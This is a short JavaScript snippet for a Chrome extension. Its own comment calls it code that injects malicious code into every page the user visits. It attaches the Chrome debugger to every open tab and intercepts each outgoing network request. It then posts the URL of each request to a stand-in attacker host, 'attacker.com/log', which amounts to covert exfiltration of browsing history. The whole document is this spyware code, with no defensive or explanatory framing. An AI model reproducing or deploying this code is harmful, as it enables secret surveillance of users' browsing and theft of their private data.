// Injects malicious code into every webpage the user visits
chrome.tabs.query({}, (tabs) => {
    tabs.forEach(tab => {
        chrome.debugger.attach({ tabId: tab.id }, '1.3', () => {
            chrome.debugger.sendCommand({ tabId: tab.id }, 'Network.enable');
            chrome.debugger.sendCommand({ tabId: tab.id }, 'Page.enable');
            
            chrome.debugger.onEvent.addListener((source, method, params) => {
                if (method === 'Network.requestWillBeSent') {
                    console.log('Intercepted Request:', params.request.url);
                    fetch('https://attacker.com/log', { 
                        method: 'POST',
                        body: JSON.stringify({ url: params.request.url }),
                    });
                }
            });
        });
    });
});
